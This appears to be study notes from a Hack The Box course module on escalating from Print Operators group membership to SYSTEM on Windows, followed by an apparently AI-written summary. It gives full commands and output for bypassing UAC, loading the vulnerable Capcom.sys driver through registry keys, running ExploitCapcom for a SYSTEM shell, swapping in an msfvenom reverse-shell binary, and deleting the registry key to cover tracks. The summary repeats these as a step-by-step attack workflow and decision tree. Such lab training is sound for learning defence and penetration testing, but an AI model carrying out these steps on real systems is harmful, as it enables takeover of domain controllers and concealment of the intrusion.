Print Operators is another highly privileged group, which grants its members the SeLoadDriverPrivilege, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down. If we issue the command whoami /priv, and don't see the SeLoadDriverPrivilege from an unelevated context, we will need to bypass UAC.

Confirming Privileges
  Print Operators
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name           Description                          State
======================== =================================    =======
SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
SeShutdownPrivilege      Shut down the system                 Disabled
Checking Privileges Again
The UACMe repo features a comprehensive list of UAC bypasses, which can be used from the command line. Alternatively, from a GUI, we can open an administrative command shell and input the credentials of the account that is a member of the Print Operators group. If we examine the privileges again, SeLoadDriverPrivilege is visible but disabled.

  Print Operators
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================  ==========
SeMachineAccountPrivilege     Add workstations to domain           Disabled
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system			       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
It's well known that the driver Capcom.sys contains functionality to allow any user to execute shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver and escalate privileges. We can use this tool to load the driver. The PoC enables the privilege as well as loads the driver for us.

Download it locally and edit it, pasting over the includes below.

Code: c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
Next, from a Visual Studio 2019 Developer Command Prompt, compile it using cl.exe.

Compile with cl.exe
  Print Operators
C:\Users\mrb3n\Desktop\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

EnableSeLoadDriverPrivilege.cpp
Microsoft (R) Incremental Linker Version 14.28.29913.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:EnableSeLoadDriverPrivilege.exe
EnableSeLoadDriverPrivilege.obj
Add Reference to Driver
Next, download the Capcom.sys driver from here, and save it to C:\temp. Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.

  Print Operators
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

The operation completed successfully.


C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

The operation completed successfully.
The odd syntax \??\ used to reference our malicious driver's ImagePath is an NT Object Path. The Win32 API will parse and resolve this path to properly locate and load our malicious driver.

Verify Driver is not Loaded
Using Nirsoft's DriverView.exe, we can verify that the Capcom.sys driver is not loaded.

  Print Operators
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
Verify Privilege is Enabled
Run the EnableSeLoadDriverPrivilege.exe binary.

  Print Operators
C:\htb> EnableSeLoadDriverPrivilege.exe

whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled
NTSTATUS: 00000000, WinError: 0
Verify Capcom Driver is Listed
Next, verify that the Capcom driver is now listed.

  Print Operators
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom

Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys
Use ExploitCapcom Tool to Escalate Privileges
To exploit the Capcom.sys, we can use the ExploitCapcom tool after compiling with it Visual Studio.

  Print Operators
PS C:\htb> .\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
This launches a shell with SYSTEM privileges.

Command prompt running as NT AUTHORITY\SYSTEM. PowerShell shows Capcom.sys driver identified and ExploitCapcom.exe executed, resulting in successful token stealing and SYSTEM shell launch.

Alternate Exploitation - No GUI
If we do not have GUI access to the target, we will have to modify the ExploitCapcom.cpp code before compiling. Here we can edit line 292 and replace "C:\\Windows\\system32\\cmd.exe" with, say, a reverse shell binary created with msfvenom, for example: c:\ProgramData\revshell.exe.

Code: c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
The CommandLine string in this example would be changed to:

Code: c
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
We would set up a listener based on the msfvenom payload we generated and hopefully receive a reverse shell connection back when executing ExploitCapcom.exe. If a reverse shell connection is blocked for some reason, we can try a bind shell or exec/add user payload.

Automating the Steps
Automating with EopLoadDriver
We can use a tool such as EoPLoadDriver to automate the process of enabling the privilege, creating the registry key, and executing NTLoadDriver to load the driver. To do this, we would run the following:

  Print Operators
C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0
We would then run ExploitCapcom.exe to pop a SYSTEM shell or run our custom binary.

Clean-up
Removing Registry Key
We can cover our tracks a bit by deleting the registry key added earlier.

  Print Operators
C:\htb> reg delete HKCU\System\CurrentControlSet\Capcom

Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes

The operation completed successfully.
Note: Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY_CURRENT_USER".


GPT Summary

üß† Summary ‚Äî Print Operators = Driver Abuse ‚Üí SYSTEM
Print Operators can:

Log into DCs locally

Shut them down

Load unsigned drivers via SeLoadDriverPrivilege

If you bypass UAC or elevate to a high-integrity shell, that privilege becomes enabled

You can then load a vulnerable driver (like Capcom.sys) and run SYSTEM-level shellcode

Very real-world-ish attack ‚Äî but has post-1803 limitations on Windows 10+

üîÅ Got This, Do That Workflow
üîç Step 1: Check Membership
cmd
Copy
Edit
net localgroup "Print Operators"
‚ö†Ô∏è Step 2: Check Privileges (with or without UAC bypass)
cmd
Copy
Edit
whoami /priv
‚úÖ Look for:

SeLoadDriverPrivilege (disabled by default)

Bypass UAC to enable it with tools like UACMe or by launching elevated shell directly

üíæ Step 3: Prep the Exploit
üîπ Option A: Manual Route
Compile EnableSeLoadDriverPrivilege.exe

Load driver path into HKCU\System\CurrentControlSet\Capcom

cmd
Copy
Edit
reg add ... /v ImagePath /d "\??\C:\Tools\Capcom.sys"
reg add ... /v Type /d 1
Run EnableSeLoadDriverPrivilege.exe

Confirm driver is loaded via DriverView or logs

üîπ Option B: Automated
Use EoPLoadDriver.exe

cmd
Copy
Edit
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
üß® Step 4: Exploit It
Run ExploitCapcom.exe

If you have GUI access ‚Üí it pops SYSTEM shell

If not ‚Üí modify source to launch:

c
Copy
Edit
TEXT("C:\\ProgramData\\revshell.exe");
then catch with your listener.

üîÄ If This, Then That Decision Tree
Condition	Action
SeLoadDriverPrivilege visible but disabled	Bypass UAC or run elevated shell
Windows 10 version < 1803	Use HKCU\System\CurrentControlSet path ‚Äî it‚Äôll work
Windows 10 version ‚â• 1803	üõë HKCU no longer works ‚Äî must use SYSTEM context or older OS
No GUI / RDP	Modify exploit to call reverse shell binary
No outbound allowed	Use bind shell or net user payload instead
üß¨ Patterns You Should Recognize
SeLoadDriverPrivilege = you control kernel-level code

Often tied to Print Operators, but also seen in:

Device drivers teams

Service accounts used for legacy hardware

Can chain with vulnerable drivers (like Capcom.sys, RTCore64.sys, etc.)

üí° Hints / Tips
Capcom.sys is a go-to for labs/CPTS, but flagged by AVs in real-world

UAC bypass is usually required to enable SeLoadDriverPrivilege

Keep DriverView or fltmc / sc query in your belt to verify drivers

If driver fails to load, double-check:

Path syntax (must be \??\C:\Path)

That driver is 100% compatible with OS version and architecture

‚úÖ Cleanup Reminder
Don‚Äôt forget:

cmd
Copy
Edit
reg delete HKCU\System\CurrentControlSet\Capcom
Also:

Delete exploit tools and binaries

Remove reverse shell payloads

üß† TL;DR:
Print Operators ‚â† printer nerds ‚Äî they‚Äôre kernel-adjacent SYSTEM slingshots
Abuse SeLoadDriverPrivilege ‚Üí load vulnerable driver ‚Üí pop SYSTEM shell
